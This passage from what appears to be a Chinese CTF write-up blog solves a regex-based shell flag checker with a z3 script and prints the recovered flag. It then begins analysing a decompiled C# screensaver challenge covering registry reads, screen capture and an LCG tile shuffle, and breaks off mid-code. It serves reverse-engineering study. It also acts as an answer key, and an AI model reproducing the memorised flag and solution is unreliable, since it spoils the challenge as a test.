fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t &quot;27,18,9,0,1,2,11,10,&quot;</span><br><span class="line">t &quot;59,50,41,32,40,48,&quot;</span><br><span class="line">t &quot;51,50,49,48,&quot;</span><br><span class="line">t &quot;6,7,8,17,26,&quot;</span><br><span class="line">t &quot;54,64,74,66,76,&quot;</span><br><span class="line">t &quot;79,80,70,&quot;</span><br><span class="line"></span><br><span class="line">u &quot;^(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;9&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;18&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;27&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;36&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;45&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;54&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;63&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;72&#125;(.)(.)(.)(.)(.)(.)(.)(.)(.)&quot;</span><br><span class="line">u &quot;^(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;1&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;2&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;3&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;4&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;5&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;6&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;7&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.).&#123;8&#125;(.)&quot;</span><br><span class="line">u &quot;^(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;3&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;27&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;30&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;33&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;54&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;57&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^.&#123;60&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.).&#123;6&#125;(.)(.)(.)&quot;</span><br><span class="line">u &quot;^(.).&#123;9&#125;(.).&#123;9&#125;(.).&#123;9&#125;(.).&#123;9&#125;(.).&#123;9&#125;(.).&#123;9&#125;(.).&#123;9&#125;(.).&#123;9&#125;(.)&quot;</span><br><span class="line">u &quot;^.&#123;8&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.).&#123;7&#125;(.)&quot;</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">echo &quot;That is correct.&quot;</span><br><span class="line">sleep 30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>原理学习网站：<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-syntax.html">https://www.runoob.com/regexp/regexp-syntax.html</a></p>
<p>在线检测正则表达式的网站：<a target="_blank" rel="noopener" href="https://regexr.com/5thoj">https://regexr.com/5thoj</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ! regexp --set a &quot;^p4\&#123;([0-9A-Q]&#123;54&#125;)\&#125;\$&quot; &quot;$flag&quot;; then halt; fi</span><br></pre></td></tr></table></figure>
<p><code>&quot;^p4\&#123;([0-9A-Q]&#123;54&#125;)\&#125;\$&quot;</code> ，<code>^p4</code> 表示以p4开头，<code>\&#123;</code> 表示匹配符号<code>&#123;</code>，<code>[]</code>是限定符 ，<code>[0-9A-Q]</code>表示只匹配从0到9，从A到Q这些字符，<code>&#123;&#125;</code>是限定匹配次数符，<code>&#123;54&#125;</code> 表示匹配54次，多一次少一次都不行</p>
<p><code>()</code>表示一个分区，匹配成功会返回分区内容，如输入<code>p4&#123;000000000000000000000000000000000000000000000000000000&#125;</code>，那么正则匹配的返回值会是<code>000000000000000000000000000000000000000000000000000000</code></p>
<p><code>$</code>表示结束符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if regexp --set a &quot;^0(.*)\$&quot; &quot;$a&quot;; then b&#x3D;&quot;$&#123;b&#125;aaa&quot;; fi</span><br></pre></td></tr></table></figure>
<p><code>&quot;^0(.*)\$&quot;</code> 其中 <code>(.*)</code> 表示一个分区，<code>.</code>表示除回车外任意字符，<code>*</code>表示任意次数匹配</p>
<p> <code>b=&quot;$&#123;b&#125;aaa&quot;</code>是shell脚本语法，<code>$&#123;b&#125;</code>表示<code>b</code>本身，整个句意即 <code>b += &quot;aaa&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if regexp --set b &quot;^aa(.*)\$&quot; &quot;$b&quot;; then c&#x3D;&quot;$&#123;c&#125;R&quot;; fi</span><br></pre></td></tr></table></figure>
<p>基本同理了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp --set D &quot;^.&#123;$C&#125;(.)&quot; &quot;$c&quot;</span><br></pre></td></tr></table></figure>
<p><code>&quot;^.&#123;$C&#125;(.)&quot;</code>中的<code>$c</code>首先会被shell脚本转义为c这个变量所代表的数字，比如说27，再拿去正则匹配 <code>^.&#123;27&#125;(.)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ! regexp &quot;^R?S?T?U?V?W?X?Y?Z?\$&quot; &quot;$A&quot;; then halt; fi</span><br></pre></td></tr></table></figure>
<p><code>?</code>表示可有可无，由于其没有<code>()</code>作为分区，所以一定要全匹配，一定要按RSTUVWXYZ的顺序出现，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ! regexp R $A; then halt; fi</span><br></pre></td></tr></table></figure>
<p>在shell脚本中，没有<code>$</code>  的变量 如 <code>R</code>，实际上就是 字符 <code>&quot;R&quot;</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>flag长度54，b长度162，c长度81</p>
<p>用z3 约束求解即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">num = [Int(<span class="string">&quot;num%d&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">81</span>)]</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;D:\0Study3\OMH_2021_CTF\1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">str1</span>):</span></span><br><span class="line">    list1 = []</span><br><span class="line">    num1 = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="built_in">len</span>(str1):</span><br><span class="line">        <span class="comment"># print(i,end=&quot;,&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> str1[i] == <span class="string">&quot;&#123;&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> str1[i+<span class="number">2</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                num1 += <span class="built_in">int</span>(str1[i+<span class="number">1</span>])</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num1 += <span class="built_in">int</span>(str1[i + <span class="number">1</span>:i+<span class="number">3</span>])</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> str1[i] == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">            list1.append(num1)</span><br><span class="line">            num1 += <span class="number">1</span></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">81</span>):</span><br><span class="line">    s.add(num[i] &gt;= <span class="number">0</span>)</span><br><span class="line">    s.add(num[i] &lt; <span class="number">9</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    list1 = parse(line)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> i != j:</span><br><span class="line">                s.add(num[list1[i]] != num[list1[j]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = []</span><br><span class="line">t.append([<span class="number">27</span>,<span class="number">18</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">10</span>])</span><br><span class="line">t.append([<span class="number">59</span>,<span class="number">50</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">48</span>])</span><br><span class="line">t.append([<span class="number">51</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">48</span>])</span><br><span class="line">t.append([<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">17</span>,<span class="number">26</span>])</span><br><span class="line">t.append([<span class="number">54</span>,<span class="number">64</span>,<span class="number">74</span>,<span class="number">66</span>,<span class="number">76</span>])</span><br><span class="line">t.append([<span class="number">79</span>,<span class="number">80</span>,<span class="number">70</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t[i])-<span class="number">1</span>):</span><br><span class="line">        s.add(num[t[i][j]] &lt; num[t[i][j+<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    print(<span class="string">&quot;find!&quot;</span>)</span><br><span class="line">    m = s.model()</span><br><span class="line">    print(m)</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m[num[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">81</span>))</span><br><span class="line">    print(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;no find!&quot;</span>)</span><br><span class="line"></span><br><span class="line">ans2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ans)):</span><br><span class="line">    n = <span class="built_in">int</span>(ans[i],<span class="number">10</span>)</span><br><span class="line">    c1 = n // <span class="number">3</span></span><br><span class="line">    c2 = n % <span class="number">3</span></span><br><span class="line">    ans2 += <span class="built_in">chr</span>(c1 + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">    ans2 += <span class="built_in">chr</span>(c2 + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line"></span><br><span class="line">ans3 = <span class="string">&quot;&quot;</span></span><br><span class="line">table1 = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQ&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ans2),<span class="number">3</span>):</span><br><span class="line">    num = (<span class="built_in">ord</span>(ans2[i+<span class="number">0</span>]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))*<span class="number">9</span> + (<span class="built_in">ord</span>(ans2[i+<span class="number">1</span>]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))*<span class="number">3</span> + (<span class="built_in">ord</span>(ans2[i+<span class="number">2</span>]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    ans3 += table1[num]</span><br><span class="line"></span><br><span class="line">print(ans3)</span><br><span class="line">print(<span class="built_in">len</span>(ans3))</span><br><span class="line"></span><br><span class="line"><span class="comment">#DOO73LBP6EI461D6HP3N2MM6M953PKJ8MK1A2BGAB8FCIQE9Q4B96E</span></span><br></pre></td></tr></table></figure>



</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/23/OMH-2021-CTF-flagsaver/">OMH_2021_CTF flagsaver</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/c/">c#</a></span><div class="content"><h2 id="windows注册表"><a href="#windows注册表" class="headerlink" title="windows注册表"></a>windows注册表</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html">https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html</a></p>
<p>Windows注册表是一个存放各种配置信息、参数的<strong>数据库</strong>，直接控制系统启动和硬件的转载和Windows程序的运行</p>
<p>既然是数据库那少不了<strong>增删改查</strong>，可以通过cmd命令实现，当然，也可以通过编程</p>
<p>注册表5个根键</p>
<ul>
<li>HKEY_CLASSES_ROOT，该根键包括启动应用程序所需的全部信息,包括扩展名,应用程序与文档之间的关系 驱动程序名,DDE和OLE信息,类ID,编号和应用程序与文档的图标等.</li>
<li>HKEY_CURRENT_USER，该根键包括当前登录用户的配置信息,包括环境变量,个人程序以及桌面设置等</li>
<li>HKEY_LOCAL_MACHINE，该根键包括本地计算机的系统信息,包括硬件和操作系统信息。 安全数据和计算机专用的各类软件设置信息</li>
<li>HKEY_USERS，该根键包括计算机的所有用户使用的配置数据</li>
<li>HKEY_CURRENT_CONFIG，该根键包括当前硬件的配置信息,其中的信息是从HKEY_LOCAL_MACHINE中映射出来的</li>
</ul>
<h2 id="c-RegistryKey"><a href="#c-RegistryKey" class="headerlink" title="c# RegistryKey"></a>c# RegistryKey</h2><p><a target="_blank" rel="noopener" href="https://www.open-open.com/code/view/1455966915480">https://www.open-open.com/code/view/1455966915480</a></p>
<blockquote>
<p>要访问注册表，可以使用Microsoft.Win32命名空间中的两个类Registry 和RegistryKey。RegistryKey实例表示一个注册表项，这个类的方法可以浏览子键、创建新键、读取或修改键中的值。换言之，该类可以完成对注册表项进行的所有操作(除了设置键的安全级别之外)</p>
</blockquote>
<p>程序传入参数<code>/c</code> 会启动类 SettingForm窗口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (text &#x3D;&#x3D; &quot;&#x2F;c&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	Application.Run(new SettingsForm());</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要输入的值会被写到 注册表项 CurrentUser的SOFTWARE\FlagSaver\text</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private void SaveSettings()</span><br><span class="line">&#123;</span><br><span class="line">	Registry.CurrentUser.CreateSubKey(&quot;SOFTWARE\\FlagSaver&quot;).SetValue(&quot;text&quot;, this.textBox.Text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>理解一下text含义：number of piece，screenshot的块数？</p>
<p>程序传入参数<code>/p</code> 会启动类 ScreenSaverForm</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (text &#x3D;&#x3D; &quot;&#x2F;p&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	if (text2 &#x3D;&#x3D; null)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox.Show(&quot;Missing handle!&quot;, &quot;FlagSaver&quot;, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	Application.Run(new ScreenSaverForm(new IntPtr(long.Parse(text2))));</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<p>类 ScreenSaverForm的 LoadSetting函数把注册表项 CurrentUser的SOFTWARE\FlagSaver\text的值读出来放到this.pieces</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private void LoadSettings()</span><br><span class="line">&#123;</span><br><span class="line">	RegistryKey registryKey &#x3D; Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\FlagSaver&quot;);</span><br><span class="line">	if (registryKey !&#x3D; null)</span><br><span class="line">	&#123;</span><br><span class="line">		this.pieces &#x3D; int.Parse((string)registryKey.GetValue(&quot;text&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="c-Timer-bounds"><a href="#c-Timer-bounds" class="headerlink" title="c# Timer bounds"></a>c# Timer bounds</h2><p>timer是C#的计时器组件，bounds是屏幕边界的意思，这里有个C#项目，学习一下就基本了解前二者了。<a target="_blank" rel="noopener" href="https://blog.csdn.net/yongh701/article/details/50131707">https://blog.csdn.net/yongh701/article/details/50131707</a></p>
<p>ScreenSaverForm构造函数，由此可知传入的是参数是一个Rectangle表示要截屏幕的范围</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public ScreenSaverForm(Rectangle Bounds)</span><br><span class="line">&#123;</span><br><span class="line">	this.InitializeComponent();</span><br><span class="line">	base.Bounds &#x3D; Bounds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="c-Screen类-Graphics类"><a href="#c-Screen类-Graphics类" class="headerlink" title="c# Screen类 Graphics类"></a>c# Screen类 Graphics类</h2><p>Screen类：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liuxiaomao1988/article/details/87435529">https://blog.csdn.net/liuxiaomao1988/article/details/87435529</a></p>
<p>Graphics类：<a target="_blank" rel="noopener" href="https://blog.csdn.net/freelmm/article/details/88832510">https://blog.csdn.net/freelmm/article/details/88832510</a></p>
<p> ScreenSaverForm：TakeScreenShot：截取当前屏幕作为Graphics实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ScreenSaver.ScreenSaverForm</span><br><span class="line">&#x2F;&#x2F; Token: 0x06000018 RID: 24 RVA: 0x000028E8 File Offset: 0x00000AE8</span><br><span class="line">private Bitmap TakeScreenShot()</span><br><span class="line">&#123;</span><br><span class="line">	Bitmap bitmap &#x3D; new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);</span><br><span class="line">	Bitmap result;</span><br><span class="line">	using (Graphics graphics &#x3D; Graphics.FromImage(bitmap))</span><br><span class="line">	&#123;</span><br><span class="line">		graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);</span><br><span class="line">		result &#x3D; bitmap;</span><br><span class="line">	&#125;</span><br><span class="line">	return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><p>线性同余生成器，主要逻辑就这个了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public long NextValue()</span><br><span class="line">&#123;</span><br><span class="line">	this.seed &#x3D; (this.a * this.seed + this.c) % this.modulus;</span><br><span class="line">	return this.seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 ShuffleArray时使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ScreenSaver.ScreenSaverForm</span><br><span class="line">&#x2F;&#x2F; Token: 0x06000013 RID: 19 RVA: 0x000027B0 File Offset: 0x000009B0</span><br><span class="line">private Image[] ShuffleArray(Image[] imgarray)</span><br><span class="line">&#123;</span><br><span class="line">	int num &#x3D; this.pieces * this.pieces;</span><br><span class="line">	LCG lcg &#x3D; new LCG(this.lcg.NextValue(), 65537L);</span><br><span class="line">	for (int i &#x3D; 0; i &lt; this.pieces; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		for (int j &#x3D; 0; j &lt; this.pieces; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			long num2 &#x3D; lcg.NextValue() % (long)num;</span><br><span class="line">			long num3 &#x3D; lcg.NextValue() % (long)num;</span><br><span class="line">			checked</span><br><span class="line">			&#123;</span><br><span class="line">				Image image &#x3D; imgarray[(int)((IntPtr)num2)];</span><br><span class="line">				imgarray[(int)((IntPtr)num2)] &#x3D; imgarray[(int)((IntPtr)num3)];</span><br><span class="line">				imgarray[(int)((IntPtr)num3)] &#x3D; image;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return imgarray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用当前lcg的下一个数当种子，生成两个随机数对 num 取余，作为index在array中取值，交换这个两个值的位置，执行num次</p>
<h2 id="MoveTimer-Tick"><a href="#MoveTimer-Tick" class="headerlink" title="MoveTimer_Tick"></a>MoveTimer_Tick</h2><p>定时器，每隔一段时间会执行一次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ScreenSaver.ScreenSaverForm</span><br><span class="line">&#x2F;&#x2F; Token: 0x06000012 RID: 18 RVA: 0x00002678 File Offset: 0x00000878</span><br><span class="line">private void MoveTimer_Tick(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">	this.jigsaw &#x3D; new Bitmap(this.screenCapture);</span><br><span class="line">	int num &#x3D; base.Width &#x2F; this.pieces;</span><br><span class="line">	int num2 &#x3D; base.Height &#x2F; this.pieces;</span><br><span class="line">	Image[] array &#x3D; new Image[this.pieces * this.pieces];</span><br><span class="line">	for (int i &#x3D; 0; i &lt; this.pieces; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		for (int j &#x3D; 0; j &lt; this.pieces; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			int num3 &#x3D; i * this.pieces + j;</span><br><span class="line">			array[num3] &#x3D; new Bitmap(num, num2);</span><br><span class="line">			Graphics graphics &#x3D; 